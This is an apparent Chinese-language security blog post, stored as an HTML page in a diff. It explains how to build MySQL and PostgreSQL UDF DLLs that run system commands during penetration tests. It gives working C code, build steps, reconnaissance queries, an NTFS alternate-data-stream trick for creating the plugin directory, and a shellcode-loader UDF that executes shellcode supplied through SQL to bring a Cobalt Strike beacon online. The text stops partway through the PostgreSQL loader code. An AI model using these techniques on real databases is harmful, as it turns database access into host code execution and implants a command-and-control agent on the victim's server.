@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lzb0t.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="udf（user defined fucntion），可以用来加载用户自己写的函数，自己写函数&#x3D;&#x3D;为所欲为。 本文就来写写在Mysql与Postgresql下添加UDF，并上线CS的方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库UDF入门与魔改">
+<meta property="og:url" content="http://lzb0t.github.io/2022/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93UDF%E5%85%A5%E9%97%A8%E4%B8%8E%E9%AD%94%E6%94%B9/index.html">
+<meta property="og:site_name" content="Lzb0t&#39;s Blog">
+<meta property="og:description" content="udf（user defined fucntion），可以用来加载用户自己写的函数，自己写函数&#x3D;&#x3D;为所欲为。 本文就来写写在Mysql与Postgresql下添加UDF，并上线CS的方法。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/data/2022/09/26/1433cf3b4945ec0529aa96b696636d91.png">
+<meta property="og:image" content="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/data/2022/09/27/2af78e75d4b847149a46ac0f52a65002.png">
+<meta property="og:image" content="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/data/2022/10/01/1c759cbaac1d30f05c06053c64c1da95.png">
+<meta property="article:published_time" content="2022-09-30T08:28:00.000Z">
+<meta property="article:modified_time" content="2022-10-01T16:56:10.907Z">
+<meta property="article:author" content="lzb0t">
+<meta property="article:tag" content="udf">
+<meta property="article:tag" content="mysql">
+<meta property="article:tag" content="postgresql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/data/2022/09/26/1433cf3b4945ec0529aa96b696636d91.png">
+
+
+<link rel="canonical" href="http://lzb0t.github.io/2022/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93UDF%E5%85%A5%E9%97%A8%E4%B8%8E%E9%AD%94%E6%94%B9/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lzb0t.github.io/2022/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93UDF%E5%85%A5%E9%97%A8%E4%B8%8E%E9%AD%94%E6%94%B9/","path":"2022/09/30/数据库UDF入门与魔改/","title":"数据库UDF入门与魔改"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>数据库UDF入门与魔改 | Lzb0t's Blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?4a639bb3e07ac8e6d252f7710a40c01c"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Lzb0t's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">3</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">1</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL"><span class="nav-number">1.</span> <span class="nav-text">MySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-UDF%E7%BC%96%E5%86%99%E4%BB%8E0%E5%88%B01"><span class="nav-number">1.1.</span> <span class="nav-text">MySQL UDF编写从0到1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.2.</span> <span class="nav-text">加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%94%B9%E4%B8%8A%E7%BA%BFCS"><span class="nav-number">1.4.</span> <span class="nav-text">魔改上线CS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Postgre"><span class="nav-number">2.</span> <span class="nav-text">Postgre</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8DLL-SO%E5%88%9B%E5%BB%BAUDF"><span class="nav-number">2.1.</span> <span class="nav-text">利用DLL&#x2F;SO创建UDF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Postgre-UDF%E7%BC%96%E5%86%99%E4%BB%8E0%E5%88%B01"><span class="nav-number">2.1.1.</span> <span class="nav-text">Postgre UDF编写从0到1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91"><span class="nav-number">2.1.2.</span> <span class="nav-text">编译</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD-1"><span class="nav-number">2.2.</span> <span class="nav-text">加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%94%B9%E4%B8%8A%E7%BA%BFCS-1"><span class="nav-number">2.3.</span> <span class="nav-text">魔改上线CS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lzb0t"
+      src="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/config/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">lzb0t</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lzb0t" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lzb0t" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lzb0t.github.io/2022/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93UDF%E5%85%A5%E9%97%A8%E4%B8%8E%E9%AD%94%E6%94%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/config/avatar.jpeg">
+      <meta itemprop="name" content="lzb0t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lzb0t's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="数据库UDF入门与魔改 | Lzb0t's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          数据库UDF入门与魔改
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-09-30 16:28:00" itemprop="dateCreated datePublished" datetime="2022-09-30T16:28:00+08:00">2022-09-30</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>udf（user defined fucntion），可以用来加载用户自己写的函数，自己写函数==为所欲为。</p>
+<p>本文就来写写在Mysql与Postgresql下添加UDF，并上线CS的方法。</p>
+<span id="more"></span>
+
+<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>Mysql中有三种方法来添加用户自定义函数：添加存储函数（Store Function）、添加原生函数（Native Function）和使用可加载函数接口（Loadable Function Interface）添加函数。</p>
+<p>其中存储函数只是一组存储在服务器中的SQL语句集合，无法调用Mysql自带函数之外的函数；原生函数需要在Mysql源码中的sql目录中添加代码，之后编译，我们添加的函数仅存在于编译好的mysql中，不太适用于打点场景；而使用可加载函数接口可以加载某个DLL（Windows平台下）或者SO（Linux平台下）文件中的函数，可以执行我们写好的函数，这种方法就是渗透中经常使用的方法了。</p>
+<p>所以在下文中，我们着重来使用可加载函数接口来创建并执行我们自定义的函数，进而执行一些命令的方法。</p>
+<h2 id="MySQL-UDF编写从0到1"><a href="#MySQL-UDF编写从0到1" class="headerlink" title="MySQL UDF编写从0到1"></a>MySQL UDF编写从0到1</h2><p>MySQL中数据类型与C++中数据类型的对应关系如下：</p>
+<table>
+<thead>
+<tr>
+<th>SQL Type</th>
+<th>C++ Type</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>STRING</td>
+<td>char *</td>
+</tr>
+<tr>
+<td>INTEGER</td>
+<td>long long</td>
+</tr>
+<tr>
+<td>REAL</td>
+<td>double</td>
+</tr>
+</tbody></table>
+<p>以创建返回值为<code>INTEGER</code>的函数为例，各部分代码如下:</p>
+<p>test.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mysql/udf_registration_types.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">test_init</span><span class="params">(</span></span><br><span class="line"><span class="params">    UDF_INIT *initid,</span></span><br><span class="line"><span class="params">    UDF_ARGS *args,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> *message</span></span><br><span class="line"><span class="params">)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在上面的代码中，<code>test_init</code>为必须定义的函数，常用于校验参数是否合法（<code>return 0</code>表示合法，函数执行顺序为<code>test_init</code>-&gt;<code>test</code>。</p>
+<p>test.def</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">    test</span><br><span class="line">    test_init</span><br></pre></td></tr></table></figure>
+
+<p>Makefile</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">options=<span class="string">&quot;-Os&quot;</span></span><br><span class="line"></span><br><span class="line">install:</span><br><span class="line">	x86_64-w64-mingw32-gcc -m64 -c $(options) test.c -I./mysql/include -Wall -shared</span><br><span class="line">	x86_64-w64-mingw32-dllwrap -m64 --def test.def *.o -o temp.dll</span><br><span class="line">	x86_64-w64-mingw32-strip -s temp.dll -o aaa.dll</span><br><span class="line">	<span class="built_in">rm</span> temp.dll test.o</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：mysql文件夹为官网下载的mysql源码。</p>
+</blockquote>
+<p>文件树如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Makefile</span><br><span class="line">├── mysql</span><br><span class="line">├── test.c</span><br><span class="line">└── test.def</span><br></pre></td></tr></table></figure>
+
+<p>之后编译，得到<code>aaa.dll</code></p>
+<h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><p>需要先进行信息搜集，主要搜集如下内容：</p>
+<ol>
+<li>系统架构：<code>select @@version_compile_os</code>（DLL/SO的架构需与系统架构一致）</li>
+<li>MySQL版本：<code>select @@version</code></li>
+<li>插件目录的绝对路径：<code>select @@plugin_dir</code></li>
+</ol>
+<p>需要注意的是可加载dll/so的路径与MySQL版本之间的关系：</p>
+<table>
+<thead>
+<tr>
+<th>MySQL版本</th>
+<th>dll/so位置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt;5.0</td>
+<td>任意</td>
+</tr>
+<tr>
+<td>5.0-5.1</td>
+<td>WinServer 2000: C:/Winnt/xxx.dll<br>其他: C:/Windows/xxx.dll或C:/Windows/system32/xxx.dll</td>
+</tr>
+<tr>
+<td>其他</td>
+<td>安装目录下的lib/plugin下，若不存在的话需要创建（直接创建或利用NTFS ADS创建。<br>如创建lib文件夹：<code>select 1 into outfile &quot;D:\\xxx\\xxx\\mysql\\lib::$INDEX_ALLOCATION&quot;;</code>虽然报错但是会创建成功）</td>
+</tr>
+</tbody></table>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>将之前编译的<code>aaa.dll</code>放到合适的目录下，利用该文件创建函数并调用，就会弹出计算器，如图：</p>
+<p><img data-src="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/data/2022/09/26/1433cf3b4945ec0529aa96b696636d91.png"></p>
+<h2 id="魔改上线CS"><a href="#魔改上线CS" class="headerlink" title="魔改上线CS"></a>魔改上线CS</h2><p>在上一部分，我们已经可以使用<code>system</code>函数打开计算器了，那再写一个shellcode加载器直接上线cs不是简简单单？</p>
+<p>使用线程注入的方式来加载从mysql中获得的shellcode（即shellcode为<code>select test(&#39;xxx&#39;)</code>中的<code>xxx</code>），代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mysql/udf_registration_types.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">test_init</span><span class="params">(</span></span><br><span class="line"><span class="params">    UDF_INIT *initid,</span></span><br><span class="line"><span class="params">    UDF_ARGS *args,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> *message</span></span><br><span class="line"><span class="params">)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">test</span><span class="params">(</span></span><br><span class="line"><span class="params">    UDF_INIT *initid,</span></span><br><span class="line"><span class="params">    UDF_ARGS *args</span></span><br><span class="line"><span class="params">)</span>&#123;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *shellcode = args-&gt;args[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> size = args-&gt;lengths[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* memory = (<span class="type">char</span> *)VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    CopyMemory(memory, shellcode, size);</span><br><span class="line">    CreateThread(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)memory,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;dwThreadId</span><br><span class="line">    );</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span>)size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img data-src="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/data/2022/09/27/2af78e75d4b847149a46ac0f52a65002.png"></p>
+<h1 id="Postgre"><a href="#Postgre" class="headerlink" title="Postgre"></a>Postgre</h1><h2 id="利用DLL-SO创建UDF"><a href="#利用DLL-SO创建UDF" class="headerlink" title="利用DLL/SO创建UDF"></a>利用DLL/SO创建UDF</h2><h3 id="Postgre-UDF编写从0到1"><a href="#Postgre-UDF编写从0到1" class="headerlink" title="Postgre UDF编写从0到1"></a>Postgre UDF编写从0到1</h3><p>Postgre中数据类型与C/C++中数据类型的对应关系，及数据类型对应的头文件如下：</p>
+<table>
+<thead>
+<tr>
+<th>SQL Type</th>
+<th>C Type</th>
+<th>Defined In</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>boolean</td>
+<td>bool</td>
+<td>postgres.h (maybe compiler built-in)</td>
+</tr>
+<tr>
+<td>box</td>
+<td>BOX*</td>
+<td>utils/geo_decls.h</td>
+</tr>
+<tr>
+<td>bytea</td>
+<td>bytea*</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>“char”</td>
+<td>char</td>
+<td>(compiler built-in)</td>
+</tr>
+<tr>
+<td>character</td>
+<td>BpChar*</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>cid</td>
+<td>CommandId</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>date</td>
+<td>DateADT</td>
+<td>utils/date.h</td>
+</tr>
+<tr>
+<td>float4 (real)</td>
+<td>float4</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>float8 (double precision)</td>
+<td>float8</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>int2 (smallint)</td>
+<td>int16</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>int4 (integer)</td>
+<td>int32</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>int8 (bigint)</td>
+<td>int64</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>interval</td>
+<td>Interval*</td>
+<td>datatype/timestamp.h</td>
+</tr>
+<tr>
+<td>lseg</td>
+<td>LSEG*</td>
+<td>utils/geo_decls.h</td>
+</tr>
+<tr>
+<td>name</td>
+<td>Name</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>numeric</td>
+<td>Numeric</td>
+<td>utils/numeric.h</td>
+</tr>
+<tr>
+<td>oid</td>
+<td>Oid</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>oidvector</td>
+<td>oidvector*</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>path</td>
+<td>PATH*</td>
+<td>utils/geo_decls.h</td>
+</tr>
+<tr>
+<td>point</td>
+<td>POINT*</td>
+<td>utils/geo_decls.h</td>
+</tr>
+<tr>
+<td>regproc</td>
+<td>RegProcedure</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>text</td>
+<td>text*</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>tid</td>
+<td>ItemPointer</td>
+<td>storage/itemptr.h</td>
+</tr>
+<tr>
+<td>time</td>
+<td>TimeADT</td>
+<td>utils/date.h</td>
+</tr>
+<tr>
+<td>time with time zone</td>
+<td>TimeTzADT</td>
+<td>utils/date.h</td>
+</tr>
+<tr>
+<td>timestamp</td>
+<td>Timestamp</td>
+<td>datatype/timestamp.h</td>
+</tr>
+<tr>
+<td>timestamp with time zone</td>
+<td>TimestampTz</td>
+<td>datatype/timestamp.h</td>
+</tr>
+<tr>
+<td>varchar</td>
+<td>VarChar*</td>
+<td>postgres.h</td>
+</tr>
+<tr>
+<td>xid</td>
+<td>TransactionId</td>
+<td>postgres.h</td>
+</tr>
+</tbody></table>
+<p>以创建返回值为<code>int16</code>的函数为例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fmgr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"></span><br><span class="line">PGDLLEXPORT Datum <span class="title function_">aaa</span><span class="params">(PG_FUNCTION_ARGS)</span>;</span><br><span class="line"></span><br><span class="line">PG_FUNCTION_INFO_V1(aaa);</span><br><span class="line"></span><br><span class="line">Datum <span class="title function_">aaa</span><span class="params">(PG_FUNCTION_ARGS)</span> &#123;</span><br><span class="line">	system(<span class="string">&quot;echo 1 &gt; E:/aaa.txt&quot;</span>);</span><br><span class="line">	PG_RETURN_INT16(<span class="number">111</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>用vs2015进行编译，各种库文件来源于postgre安装目录中的<code>include</code>文件夹。在编译时需要添加如下几个目录到附加包含目录中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include\server\port\win32_msvc</span><br><span class="line">include\server\port\win32</span><br><span class="line">include\server</span><br><span class="line">include</span><br></pre></td></tr></table></figure>
+
+<p>之后需要将<code>lib</code>文件夹下的<code>postgres.lib</code>添加到链接器的<code>附加依赖项</code>中，最后生成项目即可得到<code>bbb.dll</code></p>
+<h2 id="加载-1"><a href="#加载-1" class="headerlink" title="加载"></a>加载</h2><p>进入postgre命令行，先创建函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function aaa() returns integer as &#x27;e:/bbb.dll&#x27;,&#x27;aaa&#x27; language c strict;</span><br></pre></td></tr></table></figure>
+
+<p>之后调用函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select aaa();</span><br></pre></td></tr></table></figure>
+
+<p>然后就会在e盘下看到创建好的<code>aaa.txt</code>。</p>
+<h2 id="魔改上线CS-1"><a href="#魔改上线CS-1" class="headerlink" title="魔改上线CS"></a>魔改上线CS</h2><p>代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 